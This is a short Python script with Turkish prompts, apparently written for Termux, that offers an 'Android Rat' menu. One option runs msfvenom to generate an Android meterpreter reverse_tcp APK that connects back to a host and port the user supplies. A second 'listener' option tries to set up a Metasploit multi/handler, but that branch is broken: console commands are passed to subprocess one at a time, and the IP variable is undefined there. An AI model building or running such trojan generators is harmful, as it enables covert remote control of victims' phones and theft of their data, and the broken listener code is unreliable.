import subprocess
import sys
import signal
import time
import colorama

kirmizi = colorama.Fore.RED
yesil = colorama.Fore.GREEN
sari = colorama.Fore.YELLOW
mavi= colorama.Fore.BLUE
reset = colorama.Fore.RESET

def signal_handler(sig, frame):
    for i in range(3, -1, -1):
        print(f"{i} ", end='', flush=True)
        time.sleep(0.70)
        subprocess.run(["clear"])
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)
subprocess.run(['figlet','11001or10011'])
subprocess.run(["clear"])
print(f"{mavi}Hoşgeldin kardeş 😉 {reset}")
subprocess.run(['figlet','11001or10011'])

question = (f"""{sari}
1)Android Rat
2)Dinleyici {reset}
""")

informations  = (f"""
{mavi}
Bilgileri Giriniz: 〔IP ADRESIN〕{reset}
""")
print(question)
soru1 = int(input("Seçiniz: "))

if soru1 ==1:
 print(informations)
 ip = str(input("Ip Adresi Girin: "))
 print(f"{kirmizi}Dosya isminin sonuna .apk yazmayi unutma :) {reset}")
 isim = input("Dosya ismi ne olsun: ")
 print(f"{yesil}Oluşturuluyor.. Lütfen Bekle..{reset}")
 subprocess.run(['msfvenom','-p','android/meterpreter/reverse_tcp', f'LHOST={ip}', 'LPORT=4444','-o',f'/data/data/com.termux/files/home/{isim}'], capture_output=False)
 
elif soru1 ==2:
 print(f"{kirmizi}Ratı oluşturdun herhalde .d  neyse dinleyelim 😅 {reset}")
 subprocess.run(["msfconsole","-q"])
 subprocess.run(['use','exploit','multi/handler'])
 subprocess.run(["set","payload","android/meterpreter/reverse_tcp"])
 subprocess.run(["set","lport","4444"])
 subprocess.run(['set','lhost',ip])
 subprocess.run(["exploit"]) 
